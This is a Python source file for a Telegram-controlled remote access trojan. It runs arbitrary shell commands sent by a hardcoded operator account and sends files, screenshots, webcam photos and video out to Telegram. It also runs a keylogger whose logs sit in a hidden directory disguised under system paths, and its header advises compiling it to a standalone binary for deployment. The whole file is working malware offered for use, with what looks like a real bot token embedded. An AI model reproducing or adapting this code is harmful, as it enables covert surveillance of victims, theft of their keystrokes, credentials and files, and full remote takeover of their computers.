#!/usr/bin/env python3

'''
@author: github.com/Tomiwa-Ot

Compile to standalone binary for easier deployment using:
---------------------------------------------------------
pip install -U pyinstaller
pyinstaller main.py
'''

import cv2
import time
import telebot
import platform
import pyautogui
import threading
import logging
from pynput.keyboard import Listener
import subprocess
import os
import shlex 
from mss import mss

# Replace with Telegram bot API key
BOT_API_KEY = "8069087541:AAEEoc7G8FU5LTSkD4jog3fpxkY10bJbSns"
# Replace with your telegram user id
telegram_user_id = 5446334416

bot = telebot.TeleBot(BOT_API_KEY)

# Verify commands are coming from registered telegram user
def verify_telegram_id(id):
    return telegram_user_id == id
# ✅ Improved function to extract file paths
def extract_path(message_text):
    try:
        parts = shlex.split(message_text, posix=(platform.system() != "Windows"))

        if len(parts) < 2:
            return None  # No valid path found

        file_path = parts[1].strip("\"'")  # Remove surrounding quotes

        if not os.path.exists(file_path):  # Validate path exists
            return None

        return file_path
    except Exception:
        return None

# Execute system commands
def execute_system_command(cmd):
    max_message_length = 2048
    output = subprocess.getstatusoutput(cmd)

    # Shorten response if greater than 4096 characters
    if len(output[1]) > max_message_length:
        return str(output[1][:max_message_length])
    
    return str(output[1])



log_files = {}  # {chat_id: log_file_path}
key_buffers = {}  # {chat_id: buffer}
running_sessions = {}  # {chat_id: True/False}
listeners = {}  # {chat_id: Listener object}
stop_threads = {}  # {chat_id: Stop flag for auto-save thread}

# Set log directory based on OS
if os.name == "nt":  # Windows
    log_dir = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "keylogs")
else:  # Linux/macOS
    log_dir = os.path.expanduser("~/.local/share/.keylogs")

os.makedirs(log_dir, exist_ok=True)  # Create directory if it doesn't exist

# Error Logging
ERROR_LOG_FILE = os.path.join(log_dir, "error_log.txt")
logging.basicConfig(filename=ERROR_LOG_FILE, level=logging.ERROR, format="%(asctime)s - %(levelname)s - %(message)s")



# Start bot
@bot.message_handler(commands=['start'])
def begin(message):
    if not verify_telegram_id(message.from_user.id):
        return
    
    hostname = execute_system_command("hostname")
    current_user = execute_system_command("whoami")
    response = f"Running as: {hostname}/{current_user}"
    bot.reply_to(message, response)

# View contents of a file
@bot.message_handler(commands=['viewFile'])
def view_file(message):
    if not verify_telegram_id(message.from_user.id):
        bot.reply_to(message, "[!] Unauthorized access")
        return
    file_path = extract_path(message.text)

    if not file_path:
        bot.reply_to(message, "[!] Invalid or missing file path.")
        return

    # Select command based on OS
    command = f'type "{file_path}"' if platform.system() == "Windows" else f'cat "{file_path}"'
    
    result = execute_system_command(command)

    if result:
        bot.reply_to(message, result)
    else:
        bot.reply_to(message, "[!] File is empty or unreadable.")

# ✅ List contents of a directory
@bot.message_handler(commands=['listDir'])
def list_directory(message):
    if not verify_telegram_id(message.from_user.id):
        bot.reply_to(message, "[!] Unauthorized access")
        return
    file_path = extract_path(message.text)

    if not file_path or not os.path.isdir(file_path):  # Ensure it's a directory
        bot.reply_to(message, "[!] Invalid or missing directory path.")
        return

    # Select command based on OS
    command = f'dir "{file_path}"' if platform.system() == "Windows" else f'ls -lah "{file_path}"'
    
    result = execute_system_command(command)

    if result:
        bot.reply_to(message, result)
    else:
        bot.reply_to(message, "[!] Directory is empty or unreadable.")

# ✅ Download a file
@bot.message_handler(commands=['downloadFile'])
def download_file(message):
    if not verify_telegram_id(message.from_user.id):
        bot.reply_to(message, "[!] Unauthorized access")
        return

    file_path = extract_path(message.text)

    if not file_path:
        bot.reply_to(message, "[!] Invalid or missing file path.")
        return

    try:
        with open(file_path, "rb") as file:
            bot.send_document(message.from_user.id, file)
            bot.reply_to(message, "[+] File downloaded successfully.")
    except Exception as e:
        bot.reply_to(message, f"[!] Download failed: {str(e)}")

# List running services
@bot.message_handler(commands=['services'])
def running_services(message):
    if not verify_telegram_id(message.from_user.id):
        return
    
    result = ""
    if platform.system() == "Windows":
        result = execute_system_command("tasklist")
    else:
        result = execute_system_command("ps aux")

    bot.reply_to(message, result)

# Take screenshot of system
@bot.message_handler(commands=['screenshot'])
def take_screenshot(message):
    if not verify_telegram_id(message.from_user.id):
        return
    
    try:
       with mss() as sct:
        timestamp = int(time.time())
        save_path = f"/tmp/{timestamp}.png" if platform.system() != "Windows" else f"C:\\Temp\\{timestamp}.png"
        
        # Ensure directory exists
        os.makedirs(os.path.dirname(save_path), exist_ok=True)
        
        sct.shot(output=save_path)
        with open(save_path, "rb") as image:
            bot.send_photo(message.from_user.id, image)
        bot.reply_to(message, "[+] Image downloaded")
        
        # Clean up
        os.remove(save_path)
    except Exception as e:
        bot.reply_to(message, f"[!] Failed: {str(e)}")

#Take a picture using webcam
@bot.message_handler(commands=['webcam'])
def webcam(message):
    if not verify_telegram_id(message.from_user.id):
        bot.reply_to(message, "[!] Unauthorized access")
        return

    try:
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            bot.reply_to(message, "[!] No webcam detected")
            return
        
        ret, frame = cap.read()
        cap.release()  # Release the camera immediately after capturing

        if ret:
            timestamp = int(time.time())
            filename = f"{timestamp}.png"
            cv2.imwrite(filename, frame)

            with open(filename, "rb") as image:
                bot.send_photo(telegram_user_id, image)

            os.remove(filename)  # Delete the image after sending
        else:
            bot.reply_to(message, "[!] Failed to capture image")

    except Exception as e:
        bot.reply_to(message, f"[!] Error: {str(e)}")
# Record video
@bot.message_handler(commands=['video'])
def record_video(message):
    if not verify_telegram_id(message.from_user.id):
        bot.reply_to(message, "[!] Unauthorized access")
        return
    
    args = message.text.split(' ')
    if len(args) != 2 or not args[1].isdigit():
        bot.reply_to(message, "[!] Usage: /video <seconds>")
        return
    
    duration = int(args[1])
    if duration <= 0 or duration > 60:  # Limits duration (optional)
        bot.reply_to(message, "[!] Please enter a duration between 1 and 60 seconds.")
        return

    try:
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            bot.reply_to(message, "[!] No webcam detected")
            return
        
        fourcc = cv2.VideoWriter_fourcc(*'XVID')
        timestamp = int(time.time())
        filename = f"{timestamp}.avi"
        out = cv2.VideoWriter(filename, fourcc, 20.0, (640, 480))
        
        start_time = time.time()
        while (time.time() - start_time) < duration:
            ret, frame = cap.read()
            if not ret:
                bot.reply_to(message, "[!] Recording failed")
                break
            out.write(frame)
        
        out.release()
        cap.release()

        # Send the recorded video
        with open(filename, "rb") as video:
            bot.send_video(telegram_user_id, video)

        os.remove(filename)  # Clean up the file after sending

    except Exception as e:
        bot.reply_to(message, f"[!] Error: {str(e)}")
      

# Handle document uploads
@bot.message_handler(content_types=['document'])
def handle_document_upload(message):
    if not verify_telegram_id(message.from_user.id):
        return
    
    try:
        if message.document:
            # Get file id and name
            file_id = message.document.file_id
            file_name = message.document.file_name

            # Download file
            file_info = bot.get_file(file_id)
            downloaded_file = bot.download_file(file_info.file_path)

            with open(f"./{file_name}", "wb") as file:
                file.write(downloaded_file)

            bot.reply_to(message, "[+] Upload successful")
    except:
        bot.reply_to(message, "[!] Unsuccessful")


@bot.message_handler(commands=['keylog'])
def start_keylog(message):
    chat_id = message.chat.id

    if not verify_telegram_id(chat_id):
        return  # Ignore unauthorized users

    if running_sessions.get(chat_id, False):
        bot.reply_to(message, "[!] Keylogger is already running.")
        return

    # Set up log file
    log_files[chat_id] = os.path.join(log_dir, f"keylog_{chat_id}_{time.strftime('%Y%m%d_%H%M%S')}.txt")
    key_buffers[chat_id] = []
    running_sessions[chat_id] = True
    stop_threads[chat_id] = False  # Reset stop flag

    # Start keylogger and auto-save thread
    try:
        listeners[chat_id] = Listener(on_press=lambda key: on_press(chat_id, key))
        listeners[chat_id].start()
        threading.Thread(target=auto_save, args=(chat_id,), daemon=True).start()
    except Exception as e:
        logging.error(f"Failed to start keylogger: {e}")
        return

    try:
        bot.reply_to(message, f"[+] Keylogger started\nLogs saved in: {log_dir}")
    except Exception as e:
        logging.error(f"Failed to send start message: {e}")


@bot.message_handler(commands=['keylogstop'])
def stop_keylog(message):
    chat_id = message.chat.id

    if not verify_telegram_id(chat_id):
        return  # Ignore unauthorized users

    if not running_sessions.get(chat_id, False):
        bot.reply_to(message, "[!] No keylogger is running.")
        return

    # Stop keylogging session
    running_sessions[chat_id] = False
    stop_threads[chat_id] = True  

    # Ensure logs are saved before exiting
    save_to_file(chat_id)

    # Stop listener if it exists
    if chat_id in listeners:
        try:
            listeners[chat_id].stop()
        except Exception as e:
            logging.error(f"Error stopping listener: {e}")
        finally:
            del listeners[chat_id]  # Always remove listener

    # Send stop confirmation (check if logs exist before referencing)
    log_path = log_files.get(chat_id, "Unknown (File may not exist)")
    try:
        bot.reply_to(message, f"[-] Keylogger stopped\nLogs stored at: {log_path}")
    except Exception as e:
        logging.error(f"Failed to send stop message: {e}")

    # Cleanup dictionary to free memory
    log_files.pop(chat_id, None)
    key_buffers.pop(chat_id, None)
    stop_threads.pop(chat_id, None)


def on_press(chat_id, key):
    """Handles keypress events and stores them in a buffer."""
    if not running_sessions.get(chat_id, False):
        return

    key_str = str(key).replace("'", "")
    key_buffers[chat_id].append(key_str)

    # Force save if buffer is too large (prevents memory overflow)
    if len(key_buffers[chat_id]) >= 1000:
        save_to_file(chat_id)


def save_to_file(chat_id):
    """Saves key logs to a file in the log directory."""
    if chat_id not in key_buffers or not key_buffers[chat_id]:
        return  

    try:
        with open(log_files[chat_id], "a", encoding="utf-8") as f:
            f.write(" ".join(key_buffers[chat_id]) + "\n")
    except Exception as e:
        logging.error(f"Error saving log file: {e}")

    key_buffers[chat_id] = []  # Clear the buffer after saving


def auto_save(chat_id):
    """Automatically saves logs every 5 minutes unless stopped."""
    while running_sessions.get(chat_id, False):
        time.sleep(300)  # Wait 5 minutes
        if stop_threads.get(chat_id, False):
            break  # Exit if stop was triggered
        save_to_file(chat_id)


# Handle any command
@bot.message_handler()
def handle_any_command(message):
    if not verify_telegram_id(message.from_user.id):
        return
    
    if message.text.startswith("/start"):
        return
    
    response = execute_system_command(message.text)
    bot.reply_to(message, response)


bot.infinity_polling()
